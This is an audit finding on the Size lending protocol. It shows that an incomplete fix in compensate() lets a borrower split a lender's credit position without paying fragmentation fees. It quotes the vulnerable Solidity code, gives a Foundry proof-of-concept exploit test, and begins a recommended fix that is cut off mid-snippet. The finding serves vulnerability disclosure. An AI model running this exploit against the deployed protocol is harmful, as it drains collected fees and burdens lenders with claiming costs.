# [M] A rogue borrower can split the lender's credit position into multiple positions without paying fragmentation fees

## Summary
Severity: Medium
Reporter: serial-coder
Contest weight: 0.7693
Dataset id: 4906
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
Previously, on the C4 audit (refer to C4 report 153), I discovered that an attacker (borrower) could partially repay their loan and force the lender's credit position (creditPositionWithDebtToRepay) to split into multiple positions without paying fragmentation fees. Two approaches an attacker could previously exploit the vulnerability:
1. Execute the compensate() and specify the params.creditPositionToCompensateId == RESERVED_ID to create a new creditPositionToCompensate position (@1.1 in the snippet below) for the partial repayment (i.e., case 1: creating a new creditPositionToCompensate with credit == amountToCompensate in the snippet).
2. Execute the compensate() and point the params.creditPositionToCompensateId to an existing creditPositionToCompensate position (@2.1) for the partial repayment (i.e., case 2: loading an existing creditPositionToCompensate in the snippet).
After the bug was fixed in PR 120, the first approach was addressed properly (@1.2). Nevertheless, I discovered that the second approach was incorrectly fixed (@2.2).
To elaborate on the exploitable second approach, to bypass charging the fragmentation fee, the following conditions must be met:
1. The attacker must fully exit their creditPositionToCompensate by setting the creditPositionToCompensate.credit == amountToCompensate.
2. The amountToCompensate must be less than the creditPositionWithDebtToRepay.credit to leave the creditPositionWithDebtToRepay (lender's credit position) some credit.
More specifically, with the creditPositionToCompensate.credit == amountToCompensate, the shouldChargeFragmentationFee variable will be false (@2.2), eventually bypassing the condition check for charging the fragmentation fee (@5). Meanwhile, setting the amountToCompensate to be less than the creditPositionWithDebtToRepay.credit will split the lender's lending liquidity (USDC) from a single credit position to two credit positions (refer to @3, @4.1, and @4.2 for details).
With the above conditions, the attacker can maliciously split the lender's lending liquidity into multiple credit positions by invoking the compensate() multiple times without paying fragmentation fees.
For a better understanding, please refer to the inline @audit comments in the snippet below and the coded Proof of Concept below:
```solidity
// FILE: https://github.com/SizeCredit/size-solidity/blob/main/src/market/libraries/actions/Compensate.sol
function executeCompensate(State storage state, CompensateOnBehalfOfParams memory externalParams) external {
    emit Events.Compensate(
        msg.sender,
        onBehalfOf,
        params.creditPositionWithDebtToRepayId,
        params.creditPositionToCompensateId,
        params.amount
    );
    CreditPosition storage creditPositionWithDebtToRepay =
        state.getCreditPosition(params.creditPositionWithDebtToRepayId);
    DebtPosition storage debtPositionToRepay =
        state.getDebtPositionByCreditPositionId(params.creditPositionWithDebtToRepayId);
    uint256 amountToCompensate = Math.min(params.amount, creditPositionWithDebtToRepay.credit);
    CreditPosition memory creditPositionToCompensate;
    bool shouldChargeFragmentationFee;
    if (params.creditPositionToCompensateId == RESERVED_ID) {
        // @audit @1.1 -- Case 1: creating a new creditPositionToCompensate with credit == amountToCompensate.
        creditPositionToCompensate = state.createDebtAndCreditPositions({
            lender: onBehalfOf,
            borrower: onBehalfOf,
            futureValue: amountToCompensate,
            dueDate: debtPositionToRepay.dueDate
        });
        // @audit @1.2 -- This case was fixed properly.
        shouldChargeFragmentationFee = amountToCompensate != creditPositionWithDebtToRepay.credit;
    } else {
        // @audit @2.1 -- Case 2: loading an existing creditPositionToCompensate.
        creditPositionToCompensate = state.getCreditPosition(params.creditPositionToCompensateId);
        amountToCompensate = Math.min(amountToCompensate, creditPositionToCompensate.credit);
        // @audit @2.2 -- This case was incorrectly fixed!!!
        //
        // A rogue borrower can load an existing creditPositionToCompensate whose
        // credit == amountToCompensate, which will evaluate the shouldChargeFragmentationFee
        // variable to be false, but leave some credit of the creditPositionWithDebtToRepay >
        // (making a lender's credit split).
        shouldChargeFragmentationFee = amountToCompensate != creditPositionToCompensate.credit;
    }
    // @audit @3 -- The amountToCompensate will be deducted from the corresponding debt & credit of the target
    // creditPositionWithDebtToRepay but leave some credit (> 0) in the position.
    // debt and credit reduction
    state.reduceDebtAndCredit(
        creditPositionWithDebtToRepay.debtPositionId, params.creditPositionWithDebtToRepayId,
        amountToCompensate
    );
    // @audit @4.1 -- The createCreditPosition() is executed to exit the creditPositionToCompensate position.
    // credit emission
    state.createCreditPosition({
        exitCreditPositionId: params.creditPositionToCompensateId == RESERVED_ID
            ? state.data.nextCreditPositionId - 1
            : params.creditPositionToCompensateId,
        lender: creditPositionWithDebtToRepay.lender,
        credit: amountToCompensate,
        forSale: creditPositionWithDebtToRepay.forSale
    });
    // @audit @5 -- Since the shouldChargeFragmentationFee == false (computed in @2.2), the borrower can split
    // the lender's single credit position into two (or more) positions without paying fragmentation fees.
    if (shouldChargeFragmentationFee) {
        // charge the fragmentation fee in collateral tokens, capped by the user balance
        uint256 fragmentationFeeInCollateral = Math.min(
            state.debtTokenAmountToCollateralTokenAmount(state.feeConfig.fragmentationFee),
            state.data.collateralToken.balanceOf(onBehalfOf)
        );
        state.data.collateralToken.transferFrom(
            onBehalfOf, state.feeConfig.feeRecipient, fragmentationFeeInCollateral
        );
    }
}
// FILE: https://github.com/SizeCredit/size-solidity/blob/main/src/market/libraries/AccountingLibrary.sol
function createCreditPosition(
    State storage state,
    uint256 exitCreditPositionId,
    address lender,
    uint256 credit,
    bool forSale
) external {
    CreditPosition storage exitCreditPosition = state.getCreditPosition(exitCreditPositionId);
    // @audit @4.2 -- Since the exitCreditPosition.credit (i.e., creditPositionToCompensate.credit) == credit
    // (i.e., amountToCompensate), the creditPositionToCompensate position is exiting in full.
    //
    // As a result, the lender of the creditPositionWithDebtToRepay will become a new lender of
    // the exiting creditPositionToCompensate position.
    //
    // Now, the lender holds two credit positions (from the single lending),
    // i.e., creditPositionWithDebtToRepay and creditPositionToCompensate.
    if (exitCreditPosition.credit == credit) {
        exitCreditPosition.lender = lender;
        exitCreditPosition.forSale = forSale;
        emit Events.UpdateCreditPosition(
            exitCreditPositionId, lender, exitCreditPosition.credit, exitCreditPosition.forSale
        );
    } else {
        uint256 debtPositionId = exitCreditPosition.debtPositionId;
        reduceCredit(state, exitCreditPositionId, credit);
        CreditPosition memory creditPosition =
            CreditPosition({lender: lender, credit: credit, debtPositionId: debtPositionId, forSale: forSale});
        uint256 creditPositionId = state.data.nextCreditPositionId++;
        state.data.creditPositions[creditPositionId] = creditPosition;
        state.validateMinimumCreditOpening(creditPosition.credit);
        emit Events.CreateCreditPosition(
            creditPositionId, lender, debtPositionId, exitCreditPositionId, credit, forSale
        );
    }
}
```
• @1.1: Compensate.sol#L144-L149.
• @1.2: Compensate.sol#L150.
• @2.1: Compensate.sol#L152-L153.
• @2.2: Compensate.sol#L1554.
• @3: Compensate.sol#L158-L160.
• @4.1: Compensate.sol#L163-L170.
• @4.2: AccountingLibrary.sol#L115-L116.
• @5: Compensate.sol#L171.

Impact Explanation:
As per the protocol's docs regarding the fragmentation fee:
The Size team intends to run keeper bots to streamline the claim process and aggregate liquidity. However, this operation has some fixed costs in terms of gas, which is why a fixed fee is charged to the user causing the credit split.
The compensate() has a vulnerability that allows a rogue borrower to maliciously split their lender's credit position into multiple positions without paying fragmentation fees.
With the vulnerability, an attacker (e.g., the protocol's rivals) can force the keeper bots to claim credit positions maliciously split to drain all collected fragmentation fees. Once the collected fragmentation fees have been drained, the lender must independently claim and aggregate their split credit positions. Consequently, the lender will be grieved by a significant amount of claiming gas fees, and the lender will finally eat the loss (i.e., this vulnerability can impact both the protocol and its lenders).

## Proof of Concept
Place the test_PoC_C4IncorrectFix__borrower_forces_splitting_lender_single_credit_position_into_multiple_credit_positions() in the ./test/local/actions/Compensate.t.sol file and run the test using the command: forge test -vvv --mt test_PoC_C4IncorrectFix__borrower_forces_splitting_lender_single_credit_position_into_multiple_credit_positions.
The proof of concept shows that an attacker (Bob) can maliciously split Alice's lending liquidity (USDC) from a single credit position to 5 credit positions without paying fragmentation fees. To aggregate Alice's lending liquidity back, Alice or the protocol's keeper bots must execute the Size::claim() 5 times.
• Scenario 1: If the keeper bots execute the claim() on behalf of Alice, this attack can drain the protocol's collected fragmentation fees.
• Scenario 2: If Alice executes the claim() herself, she will be grieved by a significant amount of claiming gas fees and finally eat the loss.
```solidity
function test_PoC_C4IncorrectFix__borrower_forces_splitting_lender_single_credit_position_into_multiple_credit_positions() public {
    _setPrice(1e18);
    _updateConfig("swapFeeAPR", 0); // No swap fee for simplicity
    // 5 USDC for the fragmentation fee
    assertEq(size.feeConfig().fragmentationFee, 5e6);
    assertEq(_state().feeRecipient.borrowATokenBalance, 0);
    assertEq(_state().feeRecipient.collateralTokenBalance, 0);
    _deposit(alice, usdc, 100e6);
    _deposit(bob, weth, 200e18);
    // No lending yield for simplicity
    _buyCreditLimit(alice, block.timestamp + 365 days, YieldCurveHelper.pointCurve(365 days, 0));
    // Bob borrows Alice's 100 USDC (w/o interest for simplicity)
    uint256 debtPositionId_bob = _sellCreditMarket(bob, alice, RESERVED_ID, 100e6, 365 days, false);
    uint256 creditPositionId_alice = size.getCreditPositionIdsByDebtPositionId(debtPositionId_bob)[0];
    // Bob maliciously splits Alice's lending liquidity (USDC) in a single source credit position into other 4 credit positions (20 USDC for each)
    // and leaves the leftover 20 USDC in the source position
    Vars memory _before = _state();
    uint256[4] memory creditPositionId_alice_splits;
    for (uint256 i = 0; i < 4; i++) {
        // Self-borrowing, no lending yield
        _buyCreditLimit(bob, block.timestamp + 365 days, YieldCurveHelper.pointCurve(365 days, 0));
        uint256 debtPositionId_self_borrow_bob = _sellCreditMarket(bob, bob, RESERVED_ID, 20e6, 365 days, false);
        uint256 creditPositionToCompensateId_bob =
            size.getCreditPositionIdsByDebtPositionId(debtPositionId_self_borrow_bob)[0];
        // Split Alice's source credit position
        _compensate(bob, creditPositionId_alice, creditPositionToCompensateId_bob, 20e6);
        creditPositionId_alice_splits[i] = creditPositionToCompensateId_bob;
    }
    Vars memory _after = _state();
    // Bob neither paid fragmentation fees in borrowToken (USDC) nor collateralToken (WETH)
    assertEq(_before.bob.borrowATokenBalance, _after.bob.borrowATokenBalance);
    assertEq(_before.bob.collateralTokenBalance, _after.bob.collateralTokenBalance);
    assertEq(_state().feeRecipient.borrowATokenBalance, 0);
    assertEq(_state().feeRecipient.collateralTokenBalance, 0);
    // Bob repays the source debt position's leftover (20 USDC) and all split debt positions (80 USDC in total)
    _repay(bob, size.getCreditPosition(creditPositionId_alice).debtPositionId, bob);
    for (uint256 i = 0; i < 4; i++) {
        _repay(bob, size.getCreditPosition(creditPositionId_alice_splits[i]).debtPositionId, bob);
    }
    // Alice's lending liquidity (USDC) in a single credit position was maliciously split into 5 credit positions
    assertEq(size.getCreditPosition(creditPositionId_alice).credit, 20e6);
    assertEq(size.getCreditPosition(creditPositionId_alice_splits[0]).credit, 20e6);
    assertEq(size.getCreditPosition(creditPositionId_alice_splits[1]).credit, 20e6);
    assertEq(size.getCreditPosition(creditPositionId_alice_splits[2]).credit, 20e6);
    assertEq(size.getCreditPosition(creditPositionId_alice_splits[3]).credit, 20e6);
    // Alice (or the protocol's keeper bots) must execute the claim() 5 times to aggregate her lending liquidity (USDC) back
    // -- (Scenario 1) If the protocol's keeper bots execute the claim() on behalf of Alice, this attack can drain the protocol's collected fragmentation fees
    // -- (Scenario 2) If Alice executes the claim() by herself, she will be grieved by a significant amount of claiming gas fees, and she will finally eat the loss
    _claim(alice, creditPositionId_alice);
    _claim(alice, creditPositionId_alice_splits[0]);
    _claim(alice, creditPositionId_alice_splits[1]);
    _claim(alice, creditPositionId_alice_splits[2]);
    _claim(alice, creditPositionId_alice_splits[3]);
    assertEq(_state().alice.borrowATokenBalance, 100e6); // No yield collected from Bob for simplicity
    assertEq(_state().alice.collateralTokenBalance, 0); // Further assertion
    // Again, Bob neither paid fragmentation fees in borrowToken (USDC) nor collateralToken (WETH)
    assertEq(_state().bob.borrowATokenBalance, 0); // No yield collected from self-borrowing
    assertEq(_state().bob.collateralTokenBalance, 200e18);
    assertEq(size.feeConfig().fragmentationFee, 5e6); // 5 USDC was set for the fragmentation fee
    assertEq(_state().feeRecipient.borrowATokenBalance, 0); // No collecting fragmentation fees in borrowToken (USDC)
    assertEq(_state().feeRecipient.collateralTokenBalance, 0); // No collecting fragmentation fees in collateralToken (WETH)
}
```
Please refer to the recommended code and its coded proof of concept in the next section.

## Recommendation
Update the condition check for charging the fragmentation fee under the vulnerable edge case (i.e., loading an existing creditPositionToCompensate), like in the snippet below:
```solidity
function executeCompensate(State storage state, CompensateOnBehalfOfParams memory externalParams) external {
    CompensateParams memory params = externalParams.params;
    address onBehalfOf = externalParams.onBehalfOf;
    emit Events.Compensate(
        msg.sender,
        onBehalfOf,
        params.creditPositionWithDebtToRepayId,
        params.creditPositionToCompensateId,
        params.amount
    );
    CreditPosition storage creditPositionWithDebtToRepay =
        state.getCreditPosition(params.creditPositionWithDebtToRepayId);
    DebtPosition storage debtPositionToRepay =
        state.getDebtPositionByCreditPositionId(params.creditPositionWithDebtToRepayId);
    uint256 amountToCompensate = Math.min(params.amount, creditPositionWithDebtToRepay.credit);
    CreditPosition memory creditPositionToCompensate;
    bool shouldChargeFragmentationFee;
    if (params.creditPositionToCompensateId == RESERVED_ID) {
        creditPositionToCompensate = state.createDebtAndCreditPositions({
```
